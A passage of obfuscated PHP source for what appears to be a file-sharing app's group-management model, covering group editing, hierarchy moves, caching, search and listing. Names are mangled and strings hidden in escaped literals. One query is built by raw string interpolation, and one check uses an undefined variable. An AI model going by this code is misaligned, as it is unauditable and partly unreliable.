ƒş, $ˆ¢êâ™±[$øıÇÎ¿Ô[32]]); if (isset($ºï„ù¬Ç[$øıÇÎ¿Ô[1945]])) { $this->metaSet($û˜ ƒş, array($øıÇÎ¿Ô[1945] => $ºï„ù¬Ç[$øıÇÎ¿Ô[1945]], $øıÇÎ¿Ô[1946] => $ºï„ù¬Ç[$øıÇÎ¿Ô[1946]])); unset($ºï„ù¬Ç[$øıÇÎ¿Ô[1945]]); unset($ºï„ù¬Ç[$øıÇÎ¿Ô[1946]]); } Model($øıÇÎ¿Ô[1360])->groupRootAdd($û˜ ƒş); $this->_clearCache($ºï„ù¬Ç[$øıÇÎ¿Ô[470]]); return $û˜ ƒş; } protected function groupEdit($º×”¸Šß, $ÃÈÊ’µ±) { $ª«î‹Ó =& $_SERVER[¹òÍ›æş]; $¬şô‹•¯ = $this->getInfoSimple($º×”¸Šß); if (!$¬şô‹•¯) { return !1; } if (!empty($ÃÈÊ’µ±[$ª«î‹Ó[470]])) { $®É‘¿¨¢ = $this->getInfoSimple($ÃÈÊ’µ±[$ª«î‹Ó[470]]); if (!$®É‘¿¨¢) { return !1; } if ($¬şô‹•¯[$ª«î‹Ó[1859]] == $®É‘¿¨¢[$ª«î‹Ó[1859]]) { return !1; } if ($ÃÈÊ’µ±[$ª«î‹Ó[470]] != $¬şô‹•¯[$ª«î‹Ó[470]]) { if ($®É‘¿¨¢[$ª«î‹Ó[549]] !== $¬şô‹•¯[$ª«î‹Ó[549]] && strpos($®É‘¿¨¢[$ª«î‹Ó[549]], $¬şô‹•¯[$ª«î‹Ó[549]] . $¬şô‹•¯[$ª«î‹Ó[1859]] . $ª«î‹Ó[50]) === 0) { return !1; } $ÃÈÊ’µ±[$ª«î‹Ó[618]] = $®É‘¿¨¢[$ª«î‹Ó[549]] . $ÃÈÊ’µ±[$ª«î‹Ó[470]] . $ª«î‹Ó[50]; $this->_changeChildLevel($¬şô‹•¯, $®É‘¿¨¢); $this->_clearCache($®É‘¿¨¢[$ª«î‹Ó[1859]]); $this->_clearCache($¬şô‹•¯[$ª«î‹Ó[470]]); } } if (isset($ÃÈÊ’µ±[$ª«î‹Ó[32]])) { $this->setNamePinyin($º×”¸Šß, $ÃÈÊ’µ±[$ª«î‹Ó[32]]); } if (isset($ÃÈÊ’µ±[$ª«î‹Ó[1945]])) { $this->metaSet($º×”¸Šß, array($ª«î‹Ó[1945] => $ÃÈÊ’µ±[$ª«î‹Ó[1945]], $ª«î‹Ó[1946] => $ÃÈÊ’µ±[$ª«î‹Ó[1946]])); unset($ÃÈÊ’µ±[$ª«î‹Ó[1945]]); unset($ÃÈÊ’µ±[$ª«î‹Ó[1946]]); } $this->_clearChildrenCache($¬şô‹•¯); return $this->where(array($ª«î‹Ó[1947] => $º×”¸Šß))->save($ÃÈÊ’µ±); } private function _clearChildrenCache($è©‰µë) { $£ù§éÏ˜ =& $_SERVER[¹òÍ›æş]; $½¶÷‡¾  = array($£ù§éÏ˜[618] => array($£ù§éÏ˜[578], $è©‰µë[$£ù§éÏ˜[549]] . $è©‰µë[$£ù§éÏ˜[1859]] . $£ù§éÏ˜[579])); $ö«õò = $this->field($£ù§éÏ˜[1859])->where($½¶÷‡¾ )->select(); foreach ($ö«õò as $½áâçÛè) { $this->_clearCache($½áâçÛè[$£ù§éÏ˜[1859]]); } } private function _clearCache($ï›ÒøÒÛ) { $ï“±–®Õ =& $_SERVER[¹òÍ›æş]; $this->cacheFunctionClear($ï“±–®Õ[1941], $ï›ÒøÒÛ); $this->cacheFunctionClear($ï“±–®Õ[1942], $ï›ÒøÒÛ); } private function _changeChildLevel($Ùôëû×Á, $¸œóìş, $ıŠñ¡ø´ = false) { $îõ¹Î‹» =& $_SERVER[¹òÍ›æş]; $èˆò¥É = $Ùôëû×Á[$îõ¹Î‹»[549]] . $Ùôëû×Á[$îõ¹Î‹»[1859]] . $îõ¹Î‹»[50]; $¡Ÿ–¾ğ  = $¸œóìş[$îõ¹Î‹»[549]] . $¸œóìş[$îõ¹Î‹»[1859]] . $îõ¹Î‹»[50] . $Ùôëû×Á[$îõ¹Î‹»[1859]] . $îõ¹Î‹»[50]; if ($ıŠñ¡ø´) { $¡Ÿ–¾ğ  = $¸œóìş[$îõ¹Î‹»[549]] . $¸œóìş[$îõ¹Î‹»[1859]] . $îõ¹Î‹»[50]; } $Çö¿´òş = array($îõ¹Î‹»[618] => array($îõ¹Î‹»[578], $Ùôëû×Á[$îõ¹Î‹»[549]] . $Ùôëû×Á[$îõ¹Î‹»[1859]] . $îõ¹Î‹»[579])); $Ñ„Ã§‘Ô = array($îõ¹Î‹»[618] => array($îõ¹Î‹»[627], "\x72\145\160\154\x61\143\145\x28\160\x61\162\x65\156\x74\x4c\145\166\145\154\54\47{$èˆò¥É}\47\x2c\47{$¡Ÿ–¾ğ }\x27\51")); $this->_clearChildrenCache($Ùôëû×Á); $this->where($Çö¿´òş)->data($Ñ„Ã§‘Ô)->save(); } public function setNamePinyin($„×¼Ç®, $ªÇ©Ë† = false) { $àÄÇ·ÑØ =& $_SERVER[¹òÍ›æş]; if (!$ªÇ©Ë†) { $Šùß±“ = $this->getInfoSimple($„×¼Ç®); $ªÇ©Ë† = $Šùß±“[$àÄÇ·ÑØ[32]]; } if (!Input::check($ªÇ©Ë†, $àÄÇ·ÑØ[621])) { $this->metaSet($„×¼Ç®, $àÄÇ·ÑØ[503], null); $this->metaSet($„×¼Ç®, $àÄÇ·ÑØ[502], null); return; } $Æ„Üï†… = array($àÄÇ·ÑØ[503] => str_replace($àÄÇ·ÑØ[53], $àÄÇ·ÑØ[12], Pinyin::get($ªÇ©Ë†)), $àÄÇ·ÑØ[502] => Pinyin::get($ªÇ©Ë†, $àÄÇ·ÑØ[622])); $this->metaSet($„×¼Ç®, $Æ„Üï†…); } protected function groupStatus($ªÊ÷›²•, $„ĞÚ³¼à) { $ŠäşÕĞ– =& $_SERVER[¹òÍ›æş]; $ µ—‡ˆŠ = $this->getInfoSimple($ªÊ÷›²•); if (!$ µ—‡ˆŠ) { return !1; } if ($„ĞÚ³¼à == $ŠäşÕĞ–[98]) { $Ä‡æ‰É = $this->parentLevelArray($ µ—‡ˆŠ[$ŠäşÕĞ–[549]]); } else { $Ûæí‚ûğ = array($ŠäşÕĞ–[618] => array($ŠäşÕĞ–[578], $ µ—‡ˆŠ[$ŠäşÕĞ–[549]] . $ µ—‡ˆŠ[$ŠäşÕĞ–[1859]] . $ŠäşÕĞ–[579])); $Ä‡æ‰É = $this->where($Ûæí‚ûğ)->field($ŠäşÕĞ–[1859])->select(); $Ä‡æ‰É = array_to_keyvalue($Ä‡æ‰É, $ŠäşÕĞ–[12], $ŠäşÕĞ–[1859]); } $Ä‡æ‰É[] = $ µ—‡ˆŠ[$ŠäşÕĞ–[1859]]; $Ş˜ß«© = array(); foreach ($Ä‡æ‰É as $ªÊ÷›²•) { $Ş˜ß«©[] = array($ŠäşÕĞ–[1859] => $ªÊ÷›²•, $ŠäşÕĞ–[104] => $ŠäşÕĞ–[780], $ŠäşÕĞ–[412] => $„ĞÚ³¼à); $this->_clearCache($ªÊ÷›²•); } return Model($ŠäşÕĞ–[1948])->addAll($Ş˜ß«©, array(), !0); } protected function groupRemove($Ê–¹…¿Ò, $Áıùûû­ = false) { $ø¦èşêÖ =& $_SERVER[¹òÍ›æş]; $¹¨µ‘»² = array($ø¦èşêÖ[1859] => $Ê–¹…¿Ò); $»Î£‘Í¾ = $this->where($¹¨µ‘»²)->find(); if (!$»Î£‘Í¾ || $»Î£‘Í¾[$ø¦èşêÖ[470]] == 0) { return !1; } if (!$Áıùûû­) { $‚â¤ƒ¹ = $this->getInfoSimple($»Î£‘Í¾[$ø¦èşêÖ[470]]); $this->_changeChildLevel($»Î£‘Í¾, $‚â¤ƒ¹, !0); $this->where(array($ø¦èşêÖ[470] => $Ê–¹…¿Ò))->save(array($ø¦èşêÖ[470] => $»Î£‘Í¾[$ø¦èşêÖ[470]])); $this->_clearCache($‚â¤ƒ¹[$ø¦èşêÖ[1859]]); } Model($ø¦èşêÖ[1948])->where($¹¨µ‘»²)->delete(); Model($ø¦èşêÖ[1949])->where($¹¨µ‘»²)->delete(); Model($ø¦èşêÖ[855])->groupRootRemove($Ê–¹…¿Ò); $this->_clearCache($»Î£‘Í¾[$ø¦èşêÖ[470]]); return $this->where($¹¨µ‘»²)->delete(); } protected function groupSort($‘”¢×ÇÜ) { $§—‹öô =& $_SERVER[¹òÍ›æş]; $±¸ÎÒöí = array(); foreach ($‘”¢×ÇÜ as $¹·ñõõÒ => $‹Å¬–êù) { $±¸ÎÒöí[] = array($§—‹öô[1859], $‹Å¬–êù, $§—‹öô[1883], $¹·ñõõÒ + 1); } $this->saveAll($±¸ÎÒöí); } public function listData() { $†×¨²» = $this->_makeOrder()->selectPage(50); $this->_listDataApply($†×¨²»[$_SERVER[¹òÍ›æş][407]]); return $†×¨²»; } private function _makeOrder($¹æëœ = '') { $¦ û‡´ =& $_SERVER[¹òÍ›æş]; $á›™ê’  = array($¦ û‡´[1859], $¦ û‡´[32], $¦ û‡´[1848], $¦ û‡´[211]); $ß‘‚±Î = array($¦ û‡´[488] => $¦ û‡´[489], $¦ û‡´[490] => $¦ û‡´[491]); $òÍ½“—œ = Input::get($¦ û‡´[495], $¦ û‡´[7], $¦ û‡´[1863], $á›™ê’ ); $ÆˆÍê€° = Input::get($¦ û‡´[496], $¦ û‡´[7], $¦ û‡´[1950], array($¦ û‡´[1950], $¦ û‡´[490])); $ÆˆÍê€° = $ß‘‚±Î[$ÆˆÍê€°]; $¹æëœ = $¹æëœ . "{$òÍ½“—œ}\x20{$ÆˆÍê€°}\54\x20\147\162\x6f\165\x70\111\104\40\141\163\x63"; return $this->order($¹æëœ); } public function listChild($‰Ë‰«) { $„¥î»Û =& $_SERVER[¹òÍ›æş]; $ñÀ§ƒÉÍ = $this->where(array($„¥î»Û[470] => $‰Ë‰«))->_makeOrder()->selectPage(200); $this->_listDataApply($ñÀ§ƒÉÍ[$„¥î»Û[407]]); return $ñÀ§ƒÉÍ; } public function listChildIds($•šİè‡¨) { $Îõ»¨¨ª =& $_SERVER[¹òÍ›æş]; if (is_string($®‰ñÁùô)) { $•šİè‡¨ = explode($Îõ»¨¨ª[50], $•šİè‡¨); } $™ğ×„İ¤ = $this->where(array($Îõ»¨¨ª[1859] => array($Îõ»¨¨ª[7], $•šİè‡¨)))->field($Îõ»¨¨ª[1951])->select(); if (!$™ğ×„İ¤) { return !1; } $“”öÙ°ã = array(); foreach ($™ğ×„İ¤ as $Õğº¥ŒÍ) { $“”öÙ°ã[] = "\x73\x65\154\x65\x63\x74\x20\x67\162\x6f\x75\x70\111\x44\40\146\x72\157\155\40\140\147\162\x6f\165\x70\x60\x20\x77\150\x65\162\145\x20\x70\x61\x72\145\156\164\114\x65\166\145\154\x20\154\151\x6b\x65\40\x27{$Õğº¥ŒÍ[$Îõ»¨¨ª[549]]}{$Õğº¥ŒÍ[$Îõ»¨¨ª[1859]]}\x2c\45\x27"; } $“”öÙ°ã = implode($Îõ»¨¨ª[1952], $“”öÙ°ã); $™ğ×„İ¤ = $this->query($“”öÙ°ã); if (!$™ğ×„İ¤) { return array(); } $•šİè‡¨ = array_to_keyvalue($™ğ×„İ¤, $Îõ»¨¨ª[12], $Îõ»¨¨ª[1859]); return array_unique($•šİè‡¨); } public function listByID($¯÷Áîó) { $µä¦¶ÍÑ =& $_SERVER[¹òÍ›æş]; if (!$¯÷Áîó) { return array(); } $²ãªÜ€ = array($µä¦¶ÍÑ[1859] => array($µä¦¶ÍÑ[7], $¯÷Áîó)); $œÜ˜äƒ½ = $this->where($²ãªÜ€)->select(); $œÜ˜äƒ½ = array_sort_keep($œÜ˜äƒ½, $µä¦¶ÍÑ[1859], $¯÷Áîó); $this->_listDataApply($œÜ˜äƒ½); return $œÜ˜äƒ½; } public function listSearch($àÏäĞÅ) { $Ú«¥Ò³ =& $_SERVER[¹òÍ›æş]; $«Üè›‡ï = $àÏäĞÅ[$Ú«¥Ò³[1953]]; $ç·åŠ£ = isset($àÏäĞÅ[$Ú«¥Ò³[1954]]) ? $àÏäĞÅ[$Ú«¥Ò³[1954]] : !1; if (!trim($«Üè›‡ï)) { return !1; } $«Üè›‡ï = str_replace($Ú«¥Ò³[1955], $Ú«¥Ò³[1956], $«Üè›‡ï); $ÅÕ·”Ì³ = array($Ú«¥Ò³[1859] => array($Ú«¥Ò³[421], "{$«Üè›‡ï}\45"), $Ú«¥Ò³[32] => array($Ú«¥Ò³[421], "\x25{$«Üè›‡ï}\x25"), $Ú«¥Ò³[1027] => $Ú«¥Ò³[1957]); if ($ç·åŠ£) { $øÕÒçê¦ = $this->getInfoSimple($ç·åŠ£); $ÎÂáÙªø = $øÕÒçê¦[$Ú«¥Ò³[549]] . $ç·åŠ£ . $Ú«¥Ò³[579]; $ÅÕ·”Ì³ = array($ÅÕ·”Ì³, array($Ú«¥Ò³[549] => array($Ú«¥Ò³[421], $ÎÂáÙªø))); } $ÅÕ·”Ì³ = $this->parseWhereLike($ÅÕ·”Ì³); $Èëéï¡ = $this->_makeOrder()->where($ÅÕ·”Ì³)->selectPage(20); $Èëéï¡ = $Èëéï¡ ? $Èëéï¡ : array($Ú«¥Ò³[407] => array(), $Ú«¥Ò³[404] => array()); if (!$Èëéï¡ || count($Èëéï¡[$Ú«¥Ò³[407]]) < 5 && Input::check($«Üè›‡ï, $Ú«¥Ò³[356])) { $ç¾½ºŠ‡ = $this->groupChildrenAll($ç·åŠ£); $•ª•óê = $this->_searchFromMeta($Ú«¥Ò³[502], $«Üè›‡ï, 10, $ç¾½ºŠ‡); $»²× ¨ = $this->_searchFromMeta($Ú«¥Ò³[503], $«Üè›‡ï, 10, $ç¾½ºŠ‡); $÷¦¯à— = array_merge($•ª•óê, $»²× ¨, $Èëéï¡[$Ú«¥Ò³[407]]); $Èëéï¡[$Ú«¥Ò³[407]] = array_unique_by_key($÷¦¯à—, $Ú«¥Ò³[1859]); $Èëéï¡[$Ú«¥Ò³[404]][$Ú«¥Ò³[405]] = count($Èëéï¡[$Ú«¥Ò³[407]]); $Èëéï¡[$Ú«¥Ò³[404]][$Ú«¥Ò³[406]] = ceil($Èëéï¡[$Ú«¥Ò³[404]][$Ú«¥Ò³[405]] / $Èëéï¡[$Ú«¥Ò³[404]][$Ú«¥Ò³[401]]); } $this->_listDataApply($Èëéï¡[$Ú«¥Ò³[407]]); return $Èëéï¡; } protected function groupChildrenAll($—…Î‰×) { $Ë Õş¦  =& $_SERVER[¹òÍ›æş]; if (!$—…Î‰×) { return !1; } if (is_string($—…Î‰×)) { $—…Î‰× = array($—…Î‰×); } $šÚîØçÓ = $—…Î‰×; foreach ($—…Î‰× as $şğë†î) { $ÀÀ„„æ = $this->getInfoSimple($şğë†î); $±¹Ò³Şš = array($Ë Õş¦ [549] => array($Ë Õş¦ [421], $ÀÀ„„æ[$Ë Õş¦ [549]] . $şğë†î . $Ë Õş¦ [579])); $­Õ¼Ğ÷ = $this->field($Ë Õş¦ [1859])->where($±¹Ò³Şš)->select(); $šÚîØçÓ = array_merge($šÚîØçÓ, array_to_keyvalue($­Õ¼Ğ÷, $Ë Õş¦ [12], $Ë Õş¦ [1859])); } return array_unique($šÚîØçÓ); } private function _searchFromMeta($ÓÆîô¹¨, $É—°¾õ‰, $”ŒŞìğ, $Ùİı³ë) { $ ¨ŸıÛù =& $_SERVER[¹òÍ›æş]; $É—°¾õ‰ = strtolower($É—°¾õ‰); $àóÒ™ÖŸ = array($ ¨ŸıÛù[104] => $ÓÆîô¹¨, $ ¨ŸıÛù[412] => array($ ¨ŸıÛù[421], "\x25{$É—°¾õ‰}\x25")); $àóÒ™ÖŸ = $this->parseWhereLike($àóÒ™ÖŸ); if ($Ùİı³ë) { $àóÒ™ÖŸ[$ ¨ŸıÛù[1859]] = array($ ¨ŸıÛù[7], $Ùİı³ë); } $ÛÕ®úï× = Model($ ¨ŸıÛù[1958])->where($àóÒ™ÖŸ)->limit($”ŒŞìğ)->select(); if (!$ÛÕ®úï×) { return array(); } $ÛÕ®úï× = array_to_keyvalue($ÛÕ®úï×, $ ¨ŸıÛù[12], $ ¨ŸıÛù[1859]); $´ôşÄ€½ = $this->where(array($ ¨ŸıÛù[1947] => array($ ¨ŸıÛù[7], $ÛÕ®úï×)))->select(); if (!$´ôşÄ€½) { return array(); } return $´ôşÄ€½; } protected function _listDataApplyItem($ïÚñ†„±) { $óØŠÇ¿€ = array($ïÚñ†„±); $this->_listDataApply($óØŠÇ¿€); return $óØŠÇ¿€[0]; } protected function _listDataApply(&$‹òì°) { $šÅÕ¿¦¿ =& $_SERVER[¹òÍ›æş]; if (!$‹òì°) { return; } $»«ùüƒ— = array_to_keyvalue($‹òì°, $šÅÕ¿¦¿[12], $šÅÕ¿¦¿[1859]); $this->_listAppendChildren($‹òì°); $this->_listAppendChildrenMember($‹òì°); $this->_listAppendMeta($‹òì°, $»«ùüƒ—); $this->_listAppendParent($‹òì°); $this->_listAppendSourceRoot($‹òì°, $»«ùüƒ—); } private function _listAppendChildren(&$Ÿá¿ŸÜò) { $ığÄÓË =& $_SERVER[¹òÍ›æş]; $çùñî‡ = array_to_keyvalue($Ÿá¿ŸÜò, $ığÄÓË[12], $ığÄÓË[1859]); $„®İ„îÈ = array($ığÄÓË[470] => array($ığÄÓË[7], $çùñî‡)); $«ã³û°’ = array($ığÄÓË[470], $ığÄÓË[1959] => $ığÄÓË[529]); $Îúáùèâ = $this->field($«ã³û°’)->where($„®İ„îÈ)->group($ığÄÓË[470])->select(); $êòÓéë  = array_to_keyvalue($Îúáùèâ, $ığÄÓË[470], $ığÄÓË[529]); foreach ($Ÿá¿ŸÜò as &$Ìüéı‚) { $ÑÆé¾Ì = $Ìüéı‚[$ığÄÓË[1859]]; $Ìüéı‚[$ığÄÓË[1960]] = isset($êòÓéë [$ÑÆé¾Ì]) ? intval($êòÓéë [$ÑÆé¾Ì]) : !1; } unset($Ìüéı‚); } private function _listAppendChildrenMember(&$ÈŞª÷Å) { $ƒäÒÎÃú =& $_SERVER[¹òÍ›æş]; $²İ±ˆŞ¹ = array_to_keyvalue($ÈŞª÷Å, $ƒäÒÎÃú[12], $ƒäÒÎÃú[1859]); $œÍ«‘ğ = array($ƒäÒÎÃú[1859] => array($ƒäÒÎÃú[7], $²İ±ˆŞ¹)); $ÉÑÚèÄù = array($ƒäÒÎÃú[1859], $ƒäÒÎÃú[1959] => $ƒäÒÎÃú[529]); $Ï»¸ï” = Model($ƒäÒÎÃú[1949])->field($ÉÑÚèÄù)->where($œÍ«‘ğ)->group($ƒäÒÎÃú[1859])->select(); $¿ÏÌ‰â = array_to_keyvalue($Ï»¸ï”, $ƒäÒÎÃú[1859], $ƒäÒÎÃú[529]); foreach ($ÈŞª÷Å as &$ò¶íÒ×ƒ) { $Æ¼èÉ³Ä = $ò¶íÒ×ƒ[$ƒäÒÎÃú[1859]]; $ò¶íÒ×ƒ[$ƒäÒÎÃú[1961]] = isset($¿ÏÌ‰â[$Æ¼èÉ³Ä]) ? intval($¿ÏÌ‰â[$Æ¼èÉ³Ä]) : !1; } unset($ò¶íÒ×ƒ); } private function _listAppendMeta(&$õñğ‘ïË, $§ŞÛ¿®é) { $º±ÁòŒ =& $_SERVER[¹òÍ›æş]; $ë¼§Êâ¿ = array($º±ÁòŒ[1859] => array($º±ÁòŒ[7], $§ŞÛ¿®é)); $ŒŠéÜÍı = Model($º±ÁòŒ[1948])->where($ë¼§Êâ¿)->select(); $ŒŠéÜÍı = array_to_keyvalue_group($ŒŠéÜÍı, $º±ÁòŒ[1859]); foreach ($ŒŠéÜÍı as &$©öŞĞÍ) { $©öŞĞÍ = array_to_keyvalue($©öŞĞÍ, $º±ÁòŒ[104], $º±ÁòŒ[412]); } unset($©öŞĞÍ); foreach ($õñğ‘ïË as &$·˜Úº§ı) { $·˜Úº§ı[$º±ÁòŒ[504]] = array(); if (isset($ŒŠéÜÍı[$·˜Úº§ı[$º±ÁòŒ[1859]]])) { $·˜Úº§ı[$º±ÁòŒ[504]] = $ŒŠéÜÍı[$·˜Úº§ı[$º±ÁòŒ[1859]]]; } } unset($·˜Úº§ı); } protected function parentLevelArray($õ¼İÎòÍ) { $øåà‹© =& $_SERVER[¹òÍ›æş]; $õ¼İÎòÍ = explode($øåà‹©[50], trim($õ¼İÎòÍ, $øåà‹©[50])); $õ¼İÎòÍ = array_remove_value($õ¼İÎòÍ, $øåà‹©[208]); return $õ¼İÎòÍ; } protected function parentInGroup($ËÏ€ü š, $­†‡¿º) { $ñªº˜é² =& $_SERVER[¹òÍ›æş]; $õÉá‡û§ = $this->getInfoSimple($ËÏ€ü š); if (!$õÉá‡û§) { return !0; } $Ô•»öì = $this->parentLevelArray($õÉá‡û§[$ñªº˜é²[549]]); $Ô•»öì[] = $ËÏ€ü š; foreach ($Ô•»öì as $ËÏ€ü š) { if (in_array($ËÏ€ü š . $ñªº˜é²[12], $­†‡¿º)) { return !0; } } return !1; } private function _listAppendParent(&$¤Ë”ƒ«š) { $í°²·ºó =& $_SERVER[¹òÍ›æş]; $•»öóÆ = array(); foreach ($¤Ë”ƒ«š as &$³ÂÜåâ) { $•»öóÆ[$³ÂÜåâ[$í°²·ºó[1859]]] = $³ÂÜåâ[$í°²·ºó[32]]; $¢ª²õé§ = $this->parentLevelArray($³ÂÜåâ[$í°²·ºó[549]]); foreach ($¢ª²õé§ as $ªÑ»Ï¤) { if (!isset($•»öóÆ[$ªÑ»Ï¤])) { $•»öóÆ[$ªÑ»Ï¤] = 0; } } } unset($³ÂÜåâ); foreach ($•»öóÆ as $ûÀÄ => $Ôö³öÊ£) { if ($Ôö³öÊ£) { continue; } $Ñ–€Ï¡¿ = $this->getInfoSimple($ûÀÄ); $•»öóÆ[$ûÀÄ] = $Ñ–€Ï¡¿[$í°²·ºó[32]]; } $œôàŸ¨ = $GLOBALS[$í°²·ºó[6]][$í°²·ºó[99]][$í°²·ºó[1962]]; if ($GLOBALS[$í°²·ºó[532]] == $í°²·ºó[98]) { $œôàŸ¨ = !1; } foreach ($¤Ë”ƒ«š as &$³ÂÜåâ) { $¢ª²õé§ = $this->parentLevelArray($³ÂÜåâ[$í°²·ºó[549]]); $ı€¼İİ = $í°²·ºó[12]; foreach ($¢ª²õé§ as $ûÀÄ => $ªÑ»Ï¤) { if ($œôàŸ¨ && $ûÀÄ == 0) { continue; } $ı€¼İİ .= $•»öóÆ[$ªÑ»Ï¤] . $í°²·ºó[8]; } if ($¢ª²õé§) { $ı€¼İİ .= $³ÂÜåâ[$í°²·ºó[32]]; } $³ÂÜåâ[$í°²·ºó[554]] = str_replace($í°²·ºó[557], $í°²·ºó[8], $ı€¼İİ); } unset($³ÂÜåâ); } private function _listAppendSourceRoot(&$“×ëüƒÖ, $´ÍÜÑå) { $æÑæã»» =& $_SERVER[¹òÍ›æş]; $‹Œõ¼´æ = Model($æÑæã»»[855])->listSourceRoot(SourceModel::TYPE_GROUP, $´ÍÜÑå); $‹Œõ¼´æ = array_to_keyvalue($‹Œõ¼´æ, $æÑæã»»[534]); $‹Œõ¼´æ = array_remove_key($‹Œõ¼´æ, $æÑæã»»[534]); foreach ($“×ëüƒÖ as &$†¾ëúºã) { $†¾ëúºã[$æÑæã»»[97]] = $‹Œõ¼´æ[$†¾ëúºã[$æÑæã»»[1859]]] ? $‹Œõ¼´æ[$†¾ëúºã[$æÑæã»»[1859]]] : array(); } unset($†¾ëúºã); } protected function groupMerge($Û´ó’Ëò) { $Û´ó’Ëò = array_values(array_unique($Û´ó’Ëò)); $Ò¨„ÔúÖ = array(); for ($“­ †æ± = 0; $“­ †æ± < count($Û´ó’Ëò); $“­ †æ±++) { $È­ó’İ‹ = !1; for ($çÒ«°¼ = 0; $çÒ«°¼ < count($Û´ó’Ëò); $çÒ«°¼++) { if ($“­ †æ± == $çÒ«°¼) { continue; } if ($this->isParentOf($Û´ó’Ëò[$çÒ«°¼], $Û´ó’Ëò[$“­ †æ±])) { $È­ó’İ‹ = !0; break; } } if (!$È­ó’İ‹) { $Ò¨„ÔúÖ[] = $Û´ó’Ëò[$“­ †æ±]; } } return $Ò¨„ÔúÖ; } protected function isParentOf($Ä£¢ğÜ, $›²¾î„) { $ËÖ—Ï¤€ =& $_SERVER[¹òÍ›æş]; if (!$Ä£¢ğÜ || !$›²¾î„ || $Ä£¢ğÜ == $›²¾î„) { return !1; } $ù¤Êã£‰ = $this->getInfoSimple($Ä£¢ğÜ); $ªüÖ™¶í = $this->getInfoSimple($›²¾î„); $âÃïÆùÂ = $ù¤Êã£‰[$ËÖ—Ï¤€[549]] . $Ä£¢ğÜ . $ËÖ—Ï¤€[50]; if (substr($ªüÖ™¶í[$ËÖ—Ï¤€[549]], 0, strlen($âÃïÆùÂ)) == $âÃïÆùÂ) { return !0; } return !1; } public function groupShowRoot($²ñœÁ°Æ, $­í‚ª«º = false) { $¸©Ç“˜÷ =& $_SERVER[¹òÍ›æş]; $ºúºäğÍ = $this->getInfo($²ñœÁ°Æ); if (!$ºúºäğÍ) { return array(); } $¸µª¡Ÿ‹ = $this->parentLevelArray($ºúºäğÍ[$¸©Ç“˜÷[549]]); $ù£Á¾±• = array($²ñœÁ°Æ); if (count($¸µª¡Ÿ‹) == 0) { return $ù£Á¾±•; } if ($­í‚ª«º && count($¸µª¡Ÿ‹) == 1) { return $ù£Á¾±•; } if (!$ºúºäğÍ[$¸©Ç“˜÷[504]] || !isset($ºúºäğÍ[$¸©Ç“˜÷[504]][$¸©Ç“˜÷[1945]]) || $ºúºäğÍ[$¸©Ç“˜÷[504]][$¸©Ç“˜÷[1945]] == $¸©Ç“˜÷[1914]) { return $this->groupShowRoot($¸µª¡Ÿ‹[count($¸µª¡Ÿ‹) - 1], $­í‚ª«º); } if ($ºúºäğÍ[$¸©Ç“˜÷[504]][$¸©Ç“˜÷[1945]] == $¸©Ç“˜÷[395]) { $¹ò‚Œ¿° = explode($¸©Ç“˜÷[50], $ºúºäğÍ[$¸©Ç“˜÷[504]][$¸©Ç“˜÷[1946]]); if ($¹ò‚Œ¿°) { $ù£Á¾±• = array_merge($ù£Á¾±•, $¹ò‚Œ¿°); } } return $ù£Á¾±•; } protected function resetParentLevel() { $î•‹·®Ò =& $_SERVER[¹òÍ›æş]; $ÁÌíó¢¶ = $î•‹·®Ò[1859]; $Ğ£üÔì¥ = $this->select(); $Ğ£üÔì¥ = array_to_keyvalue($Ğ£üÔì¥, $ÁÌíó¢¶); foreach ($Ğ£üÔì¥ as $ô±‹™õ¯) { $–ñì‘º = $ô±‹™õ¯; $ÖªöƒøÃ = array(); while ($–ñì‘º[$î•‹·®Ò[470]] != 0) { $ÖªöƒøÃ[] = $–ñì‘º[$î•‹·®Ò[470]]; $–ñì‘º = $Ğ£üÔì¥[$–ñì‘º[$î•‹·®Ò[470]]]; } $ÖªöƒøÃ[] = 0; $ÖªöƒøÃ = $î•‹·®Ò[50] . implode($î•‹·®Ò[50], array_reverse($ÖªöƒøÃ)) . $î•‹·®Ò[50]; $this->setNamePinyin($ô±‹™õ¯[$ÁÌíó¢¶], $ô±‹™õ¯[$î•‹·®Ò[32]]); $this->where(array($ÁÌíó¢¶ => $ô±‹™õ¯[$ÁÌíó¢¶]))->save(array($î•‹·®Ò[618] => $ÖªöƒøÃ)); } return $Ğ£üÔì¥; } public function groupNameAuto($òç…ş³, $ğ·Ãï»ì) { $˜³é¤ =& $_SERVER[¹òÍ›æş]; $ú™·È¡Ÿ = $this->where(array($˜³é¤[439] => $òç…ş³))->getField($˜³é¤[32], !0); if (!$ú™·È¡Ÿ || !in_array($ğ·Ãï»ì, $ú™·È¡Ÿ)) { return $ğ·Ãï»ì; } for ($õ“÷±Ş´ = 1; $õ“÷±Ş´ <= count($ú™·È¡Ÿ) + 1; $õ“÷±Ş´++) { $ºÏÊóÏó = $ğ·Ãï»ì . "\x28{$õ“÷±Ş´}\51"; if (!in_array($ºÏÊóÏó, $ú™·È¡Ÿ)) { return $ºÏÊóÏó; } } } public function groupSwitch($º»ÑÑ¨ƒ, $µ²½“İù) { $¡å†»²› =& $_SERVER[¹òÍ›æş]; $úôÜì‚ = array($¡å†»²›[1859] => array($¡å†»²›[7], array($º»ÑÑ¨ƒ, $µ²½“İù))); $íí£Õªñ = $this->where($úôÜì‚)->select(); $íí£Õªñ = array_to_keyvalue($íí£Õªñ, $¡å†»²›[1859]); if (!isset($íí£Õªñ[$º»ÑÑ¨ƒ]) || !isset($íí£Õªñ[$µ²½“İù]) || $íí£Õªñ[$º»ÑÑ¨ƒ][$¡å†»²›[470]] == 0) { return !1; } $úôÜì‚ = array($¡å†»²›[1859] => $º»ÑÑ¨ƒ); $’–ç¤­ = Model($¡å†»²›[1949])->where($úôÜì‚)->select(); if (!$’–ç¤­) { $’–ç¤­ = array(); } foreach ($’–ç¤­ as $Ç³÷ö³) { $´›ûß—¯ = $Ç³÷ö³[$¡å†»²›[1669]]; $úôÜì‚ = array($¡å†»²›[1669] => $´›ûß—¯, $¡å†»²›[1859] => $µ²½“İù); $Ü¨Ÿî©Ü = Model($¡å†»²›[1949])->where($úôÜì‚)->find(); if (!$Ü¨Ÿî©Ü) { $Ó®§˜£Ø = array($µ²½“İù => $Ç³÷ö³[$¡å†»²›[1963]]); Model($¡å†»²›[563])->userGroupAdd($´›ûß—¯, $Ó®§˜£Ø); } Model($¡å†»²›[563])->userGroupRemove($´›ûß—¯, $º»ÑÑ¨ƒ); } $úôÜì‚ = array($¡å†»²›[449] => 2, $¡å†»²›[470] => 0, $¡å†»²›[448] => 1, $¡å†»²›[534] => array($¡å†»²›[7], array($º»ÑÑ¨ƒ, $µ²½“İù))); 